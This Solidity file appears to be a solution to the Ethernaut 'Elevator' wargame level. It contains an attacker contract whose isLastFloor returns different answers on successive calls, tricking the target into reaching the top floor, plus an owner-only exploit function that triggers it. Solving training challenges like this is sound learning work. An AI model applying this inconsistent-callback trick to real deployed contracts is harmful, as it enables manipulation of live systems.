// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { Building as IBuilding } from "ethernaut/11-elevator/Elevator.sol";
import { IElevator } from "ethernaut/11-elevator/IElevator.sol";

contract Building is Ownable2Step, IBuilding {
    bool private s_flag;

    // solhint-disable-next-line no-unused-vars
    function isLastFloor(uint256 _floor) external returns (bool) {
        if (!s_flag) {
            s_flag = true;
            return false;
        }
        return true;
    }

    function exploit(address _elevatorAddr, uint256 _floor) external onlyOwner {
        IElevator(_elevatorAddr).goTo(_floor);
    }
}
